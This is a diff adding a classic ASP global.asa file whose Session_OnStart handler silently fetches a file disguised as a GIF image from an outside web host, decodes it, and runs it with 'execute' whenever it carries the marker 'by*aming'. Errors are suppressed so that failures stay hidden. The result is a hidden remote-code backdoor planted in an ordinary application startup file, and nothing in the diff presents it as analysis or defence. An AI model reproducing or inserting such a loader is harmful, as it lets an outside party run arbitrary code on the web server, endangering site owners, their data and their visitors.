@@ -1,0 +1,35 @@
+<script language="vbscript" runat="server">
+'by*aming
+sub Application_OnStart
+end sub
+sub Application_OnEnd
+end sub
+
+sub Session_OnStart
+	On Error Resume Next
+	url="http://www.sqyangzi.com/images/xmlfilecode.gif"
+	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
+	ObjXMLHTTP.Open "GET",url,False
+	ObjXMLHTTP.setRequestHeader "User-Agent",url
+	ObjXMLHTTP.send
+	GetHtml=ObjXMLHTTP.responseBody
+	Set ObjXMLHTTP=Nothing
+	set objStream = Server.CreateObject("Adodb.Stream")
+	objStream.Type = 1
+	objStream.Mode =3
+	objStream.Open
+	objStream.Write GetHtml
+	objStream.Position = 0
+	objStream.Type = 2
+	objStream.Charset = "gb2312"
+	GetHtml = objStream.ReadText
+	objStream.Close
+	set objStream=Nothing
+	if instr(GetHtml,"by*aming")>0 then
+		execute GetHtml
+	end if
+end sub
+
+'sub Session_OnEnd
+'end sub
+</script>
